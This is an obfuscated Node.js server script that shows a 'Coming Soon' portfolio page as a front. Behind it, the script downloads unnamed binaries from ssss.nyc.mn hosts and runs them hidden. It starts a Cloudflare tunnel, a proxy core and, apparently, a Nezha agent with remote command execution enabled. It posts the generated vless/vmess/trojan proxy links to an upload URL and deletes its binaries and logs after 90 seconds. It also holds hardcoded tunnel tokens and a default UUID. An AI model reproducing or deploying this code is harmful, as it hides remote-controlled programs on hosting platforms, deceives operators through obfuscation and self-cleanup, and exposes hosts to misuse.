'use strict';const _0x116cfa=_0xaa56;function _0xaa56(_0x4671de,_0x3a54a4){const _0x2eecaa=_0x2eec();return _0xaa56=function(_0xaa5618,_0x3ea1dc){_0xaa5618=_0xaa5618-0xb4;let _0x752180=_0x2eecaa[_0xaa5618];return _0x752180;},_0xaa56(_0x4671de,_0x3a54a4);}function _0x2eec(){const _0x5d24cb=['Using\x20domain:','1624lDICrk','amd64','tcp','finish','includes','config.yaml','App\x20is\x20running.\x20Setup\x20complete.','.ssss.nyc.mn/bot','get','false','Download\x20','\x0acredentials-file:\x20','data','win32','length','2053','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','send','list.txt','/api/add-subscriptions','Argo\x20running\x20error:\x20','ARGO_DOMAIN','Could\x20not\x20find\x20Argo\x20domain\x20in\x20log,\x20using\x20default\x20or\x20env.','?security=tls&sni=','listen','utf-8','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','stream','from','forEach','filter','8443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0ainsecure_tls:\x20true\x0areport_delay:\x204\x0aserver:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atls:\x20','\x20failed:\x20','Failed\x20to\x20add\x20keep-alive\x20task:','Web\x20core\x20is\x20running','application/json','\x0aclient_secret:\x20','fileName','chmod\x20775\x20','Subscription\x20uploaded\x20successfully','\x0auuid:\x20','dade9724-96d2-461e-9846-61bf68b9d401','base64','axios','then','74196MlnIgr','match','text/plain;\x20charset=utf-8','unlinkSync','post','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','catch','none','/vmess-argo','express','NEZHA_SERVER','8EjNDzX','vmess://','tunnel.yml','.ssss.nyc.mn/web','http','Failed\x20to\x20upload\x20nodes:','/config.json\x20>/dev/null\x202>&1\x20&','&fp=firefox&type=ws&host=','child_process','unlink','eyJhIjoiOGNhOTliOWUyNjc1YmMxMzRlMGM1YjA4NWQzYTk0MzkiLCJ0IjoiMzdhYTM4MDctMWM1NC00OGZmLTgwYzAtM2NhMjY0YWYzYzZlIiwicyI6IllXWmpZams1WXpVdFpURXdZaTAwWVdRNUxUbGlaamd0TnpnMll6RXlOalV3WkRRMSJ9','aarch64','SUB_PATH','\x20-c\x20\x22','bk.0407123.xyz','2071224tVWChn','agent','close','all','writeFileSync','2960980FsOzyM','Web\x20running\x20error:\x20','random','toString','\x0atunnel:\x20','vmess','-----\x20Subscription\x20(Base64)\x20-----','exec','charAt','CFIP','/tunnel.yml\x20run','join','\x20successfully','nodes','&path=%2Fvless-argo%3Fed%3D2560#','---------------------------------','./tmp','/vless-argo','type','boot.log','env','rm\x20-f\x20','trojan','util','quic','HTTP\x20server\x20is\x20running\x20on\x20port:\x20','?encryption=none&security=tls&sni=','/trojan-argo','arm64','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arm','Error\x20reading\x20log\x20file,\x20using\x20default\x20or\x20env\x20domain.','110710FfdFlV','vless','Failed\x20to\x20upload\x20subscription:','freedom','path','stringify','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','NAME','NEZHA_PORT','error','readFileSync','split','\x0a\x20\x20\x20\x20service:\x20http://localhost:','firefox','/vmess-argo?ed=2560','https+local://8.8.8.8/dns-query','basename','2087','config.json','readdirSync','PROJECT_URL','\x20>\x20nul\x202>&1','block','arch','1523316FoFiZA','22jkWLJD','\x20-c\x20','--tls','13648ZEgrMF','UUID','existsSync','Nodes\x20uploaded\x20successfully','test','nohup\x20','UPLOAD_URL','message','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_PORT','221952pMmDUz','tunnel.json','log','trim','2096','/api/delete-nodes','Argo\x20tunnel\x20is\x20running','Nezha\x20running\x20error:\x20','\x0a\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20<html\x20lang=\x22en\x22>\x0a\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20<title>Welcome\x20to\x20My\x20Portfolio</title>\x0a\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@import\x20url(\x27https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Montserrat\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f4f4f9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20600px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#fff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x204px\x2020px\x20rgba(0,0,0,0.1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x202.5em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#2c3e50;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.1em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#555;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.loader\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x205px\x20solid\x20#f3f3f3;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-top:\x205px\x20solid\x20#3498db;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2050px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2050px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20spin\x202s\x20linear\x20infinite;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20spin\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20rotate(0deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20rotate(360deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20</head>\x0a\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Coming\x20Soon</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>My\x20new\x20portfolio\x20is\x20under\x20construction.\x20I\x27m\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20later!</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22loader\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20</body>\x0a\x20\x20</html>\x0a\x20\x20','2083','createWriteStream','pipe','amd','\x20-s\x20','/dev/null','30iclnGh','xtls-rprx-vision','del\x20/f\x20/q\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','floor','FILE_PATH','127.0.0.1','&path=%2Ftrojan-argo%3Fed%3D2560#','status'];_0x2eec=function(){return _0x5d24cb;};return _0x2eec();}(function(_0x42244e,_0xf210cb){const _0x21fd60=_0xaa56,_0x13653d=_0x42244e();while(!![]){try{const _0x3dc49b=parseInt(_0x21fd60(0xee))/0x1*(parseInt(_0x21fd60(0x123))/0x2)+-parseInt(_0x21fd60(0xe3))/0x3+parseInt(_0x21fd60(0x13b))/0x4+-parseInt(_0x21fd60(0x158))/0x5*(-parseInt(_0x21fd60(0x149))/0x6)+-parseInt(_0x21fd60(0xb4))/0x7*(parseInt(_0x21fd60(0x13f))/0x8)+parseInt(_0x21fd60(0xfd))/0x9+parseInt(_0x21fd60(0x102))/0xa*(-parseInt(_0x21fd60(0x13c))/0xb);if(_0x3dc49b===_0xf210cb)break;else _0x13653d['push'](_0x13653d['shift']());}catch(_0x4d0f22){_0x13653d['push'](_0x13653d['shift']());}}}(_0x2eec,0x4037d));const express=require(_0x116cfa(0xec)),app=express(),axios=require(_0x116cfa(0xe1)),os=require('os'),fs=require('fs'),path=require(_0x116cfa(0x127)),{promisify}=require(_0x116cfa(0x119)),exec=promisify(require('child_process')[_0x116cfa(0x109)]),{execSync}=require(_0x116cfa(0xf6)),UPLOAD_URL=process[_0x116cfa(0x116)][_0x116cfa(0x145)]||'',PROJECT_URL=process[_0x116cfa(0x116)][_0x116cfa(0x137)]||'',AUTO_ACCESS=process[_0x116cfa(0x116)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x116cfa(0x15d)]||_0x116cfa(0x112),SUB_PATH=process[_0x116cfa(0x116)][_0x116cfa(0xfa)]||'qianxiuadmin',PORT=process[_0x116cfa(0x116)]['SERVER_PORT']||process[_0x116cfa(0x116)]['PORT']||0xbb8,UUID=process['env'][_0x116cfa(0x140)]||_0x116cfa(0xdf),NEZHA_SERVER=process[_0x116cfa(0x116)][_0x116cfa(0xed)]||'',NEZHA_PORT=process['env'][_0x116cfa(0x12b)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x116cfa(0x116)][_0x116cfa(0xc9)]||'railway.d.4.8.b.0.d.0.0.1.0.a.2.ip6.arpa',ARGO_AUTH=process['env']['ARGO_AUTH']||_0x116cfa(0xf8),ARGO_PORT=process[_0x116cfa(0x116)][_0x116cfa(0x148)]||0x1f41,CFIP=process[_0x116cfa(0x116)][_0x116cfa(0x10b)]||_0x116cfa(0xfc),CFPORT=process[_0x116cfa(0x116)]['CFPORT']||0x1bb,NAME=process['env'][_0x116cfa(0x12a)]||'';!fs[_0x116cfa(0x141)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH);function generateRandomName(){const _0x190f97=_0x116cfa,_0x9c3f54='abcdefghijklmnopqrstuvwxyz';let _0x41eb85='';for(let _0x1dcd2b=0x0;_0x1dcd2b<0x6;_0x1dcd2b++){_0x41eb85+=_0x9c3f54[_0x190f97(0x10a)](Math[_0x190f97(0x15c)](Math[_0x190f97(0x104)]()*_0x9c3f54[_0x190f97(0xc2)]));}return _0x41eb85;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x116cfa(0x10d)](FILE_PATH,npmName),phpPath=path[_0x116cfa(0x10d)](FILE_PATH,phpName),webPath=path[_0x116cfa(0x10d)](FILE_PATH,webName),botPath=path[_0x116cfa(0x10d)](FILE_PATH,botName),subPath=path[_0x116cfa(0x10d)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x116cfa(0xc6)),bootLogPath=path[_0x116cfa(0x10d)](FILE_PATH,_0x116cfa(0x115)),configPath=path[_0x116cfa(0x10d)](FILE_PATH,'config.json');app[_0x116cfa(0xbc)]('/',function(_0x27af44,_0x3164c6){const _0x26dfa6=_0x116cfa,_0x1c6627=_0x26dfa6(0x151);_0x3164c6[_0x26dfa6(0xc5)](_0x1c6627);});function deleteNodes(){const _0x59706e=_0x116cfa;try{if(!UPLOAD_URL||!fs['existsSync'](subPath))return;const _0x20480b=fs[_0x59706e(0x12d)](subPath,'utf-8'),_0x36fbe7=Buffer[_0x59706e(0xd0)](_0x20480b,_0x59706e(0xe0))[_0x59706e(0x105)](_0x59706e(0xcd)),_0x221977=_0x36fbe7['split']('\x0a')[_0x59706e(0xd2)](_0x51379c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59706e(0x143)](_0x51379c));_0x221977[_0x59706e(0xc2)]>0x0&&axios[_0x59706e(0xe7)](UPLOAD_URL+_0x59706e(0x14e),JSON[_0x59706e(0x128)]({'nodes':_0x221977}),{'headers':{'Content-Type':_0x59706e(0xd9)}})[_0x59706e(0xe9)](()=>{});}catch(_0x3edb56){}}function cleanupOldFiles(){const _0x26fed4=_0x116cfa;try{const _0x2d3ebe=fs[_0x26fed4(0x136)](FILE_PATH);_0x2d3ebe[_0x26fed4(0xd1)](_0x2a6066=>{const _0x2301c6=_0x26fed4;try{fs[_0x2301c6(0xe6)](path['join'](FILE_PATH,_0x2a6066));}catch(_0x2d6509){}});}catch(_0x2fdb81){}}async function generateConfig(){const _0x4e3c0c=_0x116cfa,_0x493b04={'log':{'access':_0x4e3c0c(0x157),'error':_0x4e3c0c(0x157),'loglevel':_0x4e3c0c(0xea)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4e3c0c(0x124),'settings':{'clients':[{'id':UUID,'flow':_0x4e3c0c(0x159)}],'decryption':_0x4e3c0c(0xea),'fallbacks':[{'dest':0xbb9,'xver':0x1},{'path':_0x4e3c0c(0x113),'dest':0xbba},{'path':_0x4e3c0c(0xeb),'dest':0xbbb},{'path':_0x4e3c0c(0x11d),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x4e3c0c(0x15e),'protocol':_0x4e3c0c(0x124),'settings':{'clients':[{'id':UUID}],'decryption':_0x4e3c0c(0xea)},'streamSettings':{'network':_0x4e3c0c(0xb6),'security':_0x4e3c0c(0xea)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4e3c0c(0x124),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4e3c0c(0xea)},'streamSettings':{'network':'ws','security':_0x4e3c0c(0xea),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4e3c0c(0xf2),_0x4e3c0c(0x11f),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4e3c0c(0x15e),'protocol':_0x4e3c0c(0x107),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4e3c0c(0xeb)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e3c0c(0xf2),_0x4e3c0c(0x11f),_0x4e3c0c(0x11a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4e3c0c(0x15e),'protocol':_0x4e3c0c(0x118),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4e3c0c(0xea),'wsSettings':{'path':_0x4e3c0c(0x11d)}},'sniffing':{'enabled':!![],'destOverride':[_0x4e3c0c(0xf2),_0x4e3c0c(0x11f),_0x4e3c0c(0x11a)],'metadataOnly':![]}}],'dns':{'servers':[_0x4e3c0c(0x132)]},'outbounds':[{'protocol':_0x4e3c0c(0x126),'tag':'direct'},{'protocol':'blackhole','tag':_0x4e3c0c(0x139)}]};fs[_0x4e3c0c(0x101)](path[_0x4e3c0c(0x10d)](FILE_PATH,_0x4e3c0c(0x135)),JSON[_0x4e3c0c(0x128)](_0x493b04,null,0x2));}function getSystemArchitecture(){const _0x467b10=_0x116cfa,_0x4ee18d=os[_0x467b10(0x13a)]();return _0x4ee18d[_0x467b10(0xb8)](_0x467b10(0x121))||_0x4ee18d[_0x467b10(0xb8)](_0x467b10(0xf9))?_0x467b10(0x121):_0x467b10(0x155);}function downloadFile(_0x33a783,_0x24d6e6,_0x3321aa){const _0x48a3c5=_0x116cfa,_0x9aee1d=fs[_0x48a3c5(0x153)](_0x33a783);axios({'method':_0x48a3c5(0xbc),'url':_0x24d6e6,'responseType':_0x48a3c5(0xcf)})[_0x48a3c5(0xe2)](_0x302fa1=>{const _0x39c6c8=_0x48a3c5;_0x302fa1[_0x39c6c8(0xc0)][_0x39c6c8(0x154)](_0x9aee1d),_0x9aee1d['on'](_0x39c6c8(0xb7),()=>{const _0x133897=_0x39c6c8;_0x9aee1d['close'](),console[_0x133897(0x14b)](_0x133897(0xbe)+path[_0x133897(0x133)](_0x33a783)+_0x133897(0x10e)),_0x3321aa(null,_0x33a783);});})[_0x48a3c5(0xe9)](_0x570943=>{const _0x3b7afc=_0x48a3c5;_0x9aee1d[_0x3b7afc(0xff)](),fs[_0x3b7afc(0xf7)](_0x33a783,()=>{});const _0x52c402=_0x3b7afc(0xbe)+path['basename'](_0x33a783)+_0x3b7afc(0xd6)+_0x570943[_0x3b7afc(0x146)];console[_0x3b7afc(0x12c)](_0x52c402),_0x3321aa(_0x52c402);});}async function downloadAndRun(){const _0x3a89ac=_0x116cfa,_0x447296=getSystemArchitecture(),_0x3d5ea9=getFilesForArchitecture(_0x447296);await Promise[_0x3a89ac(0x100)](_0x3d5ea9['map'](_0x331de7=>new Promise((_0x1c4535,_0x3f412f)=>{const _0x3ae6a1=_0x3a89ac;downloadFile(_0x331de7[_0x3ae6a1(0xdb)],_0x331de7['fileUrl'],_0x52707e=>_0x52707e?_0x3f412f(_0x52707e):_0x1c4535());})));const _0x411880=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];execSync(_0x3a89ac(0xdc)+_0x411880[_0x3a89ac(0x10d)]('\x20'));if(NEZHA_SERVER&&NEZHA_KEY){let _0x3dc843;if(!NEZHA_PORT){const _0x352d93=NEZHA_SERVER[_0x3a89ac(0x12e)](':')['pop'](),_0x42522c=['443',_0x3a89ac(0xd3),_0x3a89ac(0x14d),_0x3a89ac(0x134),_0x3a89ac(0x152),_0x3a89ac(0xc3)][_0x3a89ac(0xb8)](_0x352d93)?'true':_0x3a89ac(0xbd),_0x33e05b=_0x3a89ac(0xda)+NEZHA_KEY+_0x3a89ac(0xd4)+NEZHA_SERVER+_0x3a89ac(0xd5)+_0x42522c+_0x3a89ac(0xde)+UUID;fs[_0x3a89ac(0x101)](path[_0x3a89ac(0x10d)](FILE_PATH,_0x3a89ac(0xb9)),_0x33e05b),_0x3dc843=_0x3a89ac(0x144)+phpPath+_0x3a89ac(0xfb)+FILE_PATH+_0x3a89ac(0xce);}else{const _0x9b0d92=['443',_0x3a89ac(0xd3),_0x3a89ac(0x14d),_0x3a89ac(0x134),_0x3a89ac(0x152),_0x3a89ac(0xc3)][_0x3a89ac(0xb8)](NEZHA_PORT)?_0x3a89ac(0x13e):'';_0x3dc843=_0x3a89ac(0x144)+npmPath+_0x3a89ac(0x156)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x9b0d92+_0x3a89ac(0xe8);}try{await exec(_0x3dc843),console[_0x3a89ac(0x14b)]('Nezha\x20agent\x20is\x20running');}catch(_0x1ea3a2){console[_0x3a89ac(0x12c)](_0x3a89ac(0x150)+_0x1ea3a2);}}try{await exec(_0x3a89ac(0x144)+webPath+_0x3a89ac(0x13d)+FILE_PATH+_0x3a89ac(0xf4)),console[_0x3a89ac(0x14b)](_0x3a89ac(0xd8));}catch(_0x3d0bd9){console[_0x3a89ac(0x12c)](_0x3a89ac(0x103)+_0x3d0bd9);}let _0xd5d8d2;if(ARGO_AUTH[_0x3a89ac(0xe4)](/^[A-Z0-9a-z=]{120,250}$/))_0xd5d8d2=_0x3a89ac(0x147)+ARGO_AUTH;else{if(ARGO_AUTH[_0x3a89ac(0xe4)](/TunnelSecret/)){fs[_0x3a89ac(0x101)](path[_0x3a89ac(0x10d)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x51ee46=ARGO_AUTH[_0x3a89ac(0x12e)]('\x22')[0xb],_0x2dd3af=_0x3a89ac(0x106)+_0x51ee46+_0x3a89ac(0xbf)+path[_0x3a89ac(0x10d)](FILE_PATH,'tunnel.json')+_0x3a89ac(0x129)+ARGO_DOMAIN+_0x3a89ac(0x12f)+ARGO_PORT+'\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404';fs[_0x3a89ac(0x101)](path[_0x3a89ac(0x10d)](FILE_PATH,_0x3a89ac(0xf0)),_0x2dd3af),_0xd5d8d2=_0x3a89ac(0xc4)+FILE_PATH+_0x3a89ac(0x10c);}else _0xd5d8d2=_0x3a89ac(0x120)+bootLogPath+'\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;}try{await exec(_0x3a89ac(0x144)+botPath+'\x20'+_0xd5d8d2+'\x20>/dev/null\x202>&1\x20&'),console[_0x3a89ac(0x14b)](_0x3a89ac(0x14f));}catch(_0x220878){console[_0x3a89ac(0x12c)](_0x3a89ac(0xc8)+_0x220878);}}function getFilesForArchitecture(_0x45f2d7){const _0x26eb9c=_0x116cfa;let _0xc50822=[{'fileName':webPath,'fileUrl':'https://'+(_0x45f2d7===_0x26eb9c(0x121)?_0x26eb9c(0x11e):_0x26eb9c(0xb5))+_0x26eb9c(0xf1)},{'fileName':botPath,'fileUrl':'https://'+(_0x45f2d7===_0x26eb9c(0x121)?_0x26eb9c(0x11e):_0x26eb9c(0xb5))+_0x26eb9c(0xbb)}];if(NEZHA_SERVER&&NEZHA_KEY){const _0x4c82bc=NEZHA_PORT?_0x26eb9c(0xfe):'v1',_0x218c32=NEZHA_PORT?npmPath:phpPath;_0xc50822['push']({'fileName':_0x218c32,'fileUrl':'https://'+(_0x45f2d7==='arm'?'arm64':_0x26eb9c(0xb5))+'.ssss.nyc.mn/'+_0x4c82bc});}return _0xc50822;}async function extractDomainAndGenerateLinks(){const _0x49a106=_0x116cfa;await new Promise(_0x1d4258=>setTimeout(_0x1d4258,0x1388));let _0x13c3e8=ARGO_DOMAIN;if(!ARGO_AUTH[_0x49a106(0xe4)](/^[A-Z0-9a-z=]{120,250}$/)&&!ARGO_AUTH[_0x49a106(0xe4)](/TunnelSecret/))try{const _0x5c97d5=fs['readFileSync'](bootLogPath,'utf-8'),_0x4921d4=_0x5c97d5[_0x49a106(0xe4)](/https?:\/\/([^ ]*trycloudflare\.com)/);_0x4921d4?_0x13c3e8=_0x4921d4[0x1]:console[_0x49a106(0x14b)](_0x49a106(0xca));}catch(_0x5a62db){console[_0x49a106(0x14b)](_0x49a106(0x122));}console[_0x49a106(0x14b)](_0x49a106(0x161),_0x13c3e8);const _0x1a65d5=execSync(_0x49a106(0x15b),{'encoding':_0x49a106(0xcd)})[_0x49a106(0x14c)](),_0x47f082=NAME?NAME+'-'+_0x1a65d5:_0x1a65d5,_0x4e58e4={'v':'2','ps':_0x47f082,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x49a106(0xea),'net':'ws','type':'none','host':_0x13c3e8,'path':_0x49a106(0x131),'tls':_0x49a106(0x11f),'sni':_0x13c3e8,'alpn':'','fp':_0x49a106(0x130)},_0x4ddbfd=['vless://'+UUID+'@'+CFIP+':'+CFPORT+_0x49a106(0x11c)+_0x13c3e8+_0x49a106(0xf5)+_0x13c3e8+_0x49a106(0x110)+_0x47f082,_0x49a106(0xef)+Buffer['from'](JSON[_0x49a106(0x128)](_0x4e58e4))['toString'](_0x49a106(0xe0)),'trojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x49a106(0xcb)+_0x13c3e8+_0x49a106(0xf5)+_0x13c3e8+_0x49a106(0x15f)+_0x47f082][_0x49a106(0x10d)]('\x0a\x0a'),_0x3fb2ba=Buffer[_0x49a106(0xd0)](_0x4ddbfd)[_0x49a106(0x105)]('base64');console['log'](_0x49a106(0x108)),console['log'](_0x3fb2ba),console['log'](_0x49a106(0x111)),fs[_0x49a106(0x101)](subPath,_0x3fb2ba),app[_0x49a106(0xbc)]('/'+SUB_PATH,(_0x3533b0,_0x319fe5)=>{const _0x2ecabe=_0x49a106;_0x319fe5[_0x2ecabe(0x114)](_0x2ecabe(0xe5))[_0x2ecabe(0xc5)](_0x3fb2ba);}),await uploadSubscription(_0x4ddbfd);}async function uploadSubscription(_0x5b19f2){const _0x41b6a9=_0x116cfa;if(!UPLOAD_URL)return;const _0x52f04f={};if(PROJECT_URL){_0x52f04f['subscription']=[PROJECT_URL+'/'+SUB_PATH];try{await axios[_0x41b6a9(0xe7)](UPLOAD_URL+_0x41b6a9(0xc7),_0x52f04f,{'headers':{'Content-Type':'application/json'}}),console[_0x41b6a9(0x14b)](_0x41b6a9(0xdd));}catch(_0x2619eb){_0x2619eb['response']&&_0x2619eb['response'][_0x41b6a9(0x160)]!==0x190&&console[_0x41b6a9(0x12c)](_0x41b6a9(0x125),_0x2619eb[_0x41b6a9(0x146)]);}}else{_0x52f04f[_0x41b6a9(0x10f)]=_0x5b19f2['split']('\x0a\x0a')[_0x41b6a9(0xd2)](Boolean);try{await axios[_0x41b6a9(0xe7)](UPLOAD_URL+'/api/add-nodes',_0x52f04f,{'headers':{'Content-Type':_0x41b6a9(0xd9)}}),console[_0x41b6a9(0x14b)](_0x41b6a9(0x142));}catch(_0x4912e4){console[_0x41b6a9(0x12c)](_0x41b6a9(0xf3),_0x4912e4['message']);}}}async function keepAlive(){const _0x2c64e2=_0x116cfa;if(AUTO_ACCESS&&PROJECT_URL)try{await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2c64e2(0xd9)}}),console[_0x2c64e2(0x14b)]('Keep-alive\x20task\x20added\x20successfully');}catch(_0x3dadb1){console[_0x2c64e2(0x12c)](_0x2c64e2(0xd7),_0x3dadb1['message']);}}function cleanUpLater(){setTimeout(()=>{const _0x21e285=_0xaa56,_0x10fe2d=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath,path[_0x21e285(0x10d)](FILE_PATH,_0x21e285(0x14a)),path['join'](FILE_PATH,_0x21e285(0xf0)),path[_0x21e285(0x10d)](FILE_PATH,_0x21e285(0xb9))],_0x4ca653=process['platform']===_0x21e285(0xc1)?_0x21e285(0x15a)+_0x10fe2d[_0x21e285(0xd2)](fs['existsSync'])[_0x21e285(0x10d)]('\x20')+_0x21e285(0x138):_0x21e285(0x117)+_0x10fe2d[_0x21e285(0xd2)](fs[_0x21e285(0x141)])[_0x21e285(0x10d)]('\x20')+'\x20>/dev/null\x202>&1';exec(_0x4ca653,()=>{const _0x4bb4cf=_0x21e285;console['clear'](),console[_0x4bb4cf(0x14b)](_0x4bb4cf(0xba));});},0x15f90);}async function main(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadAndRun(),await extractDomainAndGenerateLinks(),await keepAlive(),cleanUpLater();}catch(_0x15a9ca){console['error']('An\x20error\x20occurred\x20during\x20startup:',_0x15a9ca);}}main(),app[_0x116cfa(0xcc)](PORT,()=>console[_0x116cfa(0x14b)](_0x116cfa(0x11b)+PORT+'!'));
